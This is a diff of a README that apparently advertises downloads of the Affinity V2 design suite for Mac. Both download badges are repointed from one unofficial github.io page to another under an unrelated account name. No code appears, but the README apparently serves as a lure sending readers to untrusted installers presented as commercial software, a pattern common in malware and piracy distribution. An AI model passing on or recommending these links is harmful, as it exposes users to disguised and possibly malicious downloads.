@@ -3,7 +3,7 @@
 ![Affinity V2 Banner](https://cdn.serif.com/store/img/og/og-download-110820220903.png)  
 *Powerful design tools for Mac users*
 
-[![Download Now](https://img.shields.io/badge/Download-Affinity_V2-blueviolet?style=for-the-badge&logo=apple)](https://affinity-v2-universal-mac-download.github.io/.github/)
+[![Download Now](https://img.shields.io/badge/Download-Affinity_V2-blueviolet?style=for-the-badge&logo=apple)](https://montiko384.github.io/.github/universal)
 
 ---
 
@@ -82,7 +82,7 @@ The universal license provides access to all three applications with cross-platf
 
 ---
 
-[![Get Affinity V2](https://img.shields.io/badge/Download-Complete_Suite-blueviolet?style=for-the-badge&logo=apple)](https://affinity-v2-universal-mac-download.github.io/.github/)
+[![Get Affinity V2](https://img.shields.io/badge/Download-Complete_Suite-blueviolet?style=for-the-badge&logo=apple)](https://montiko384.github.io/.github/universal)
 
 ---
 
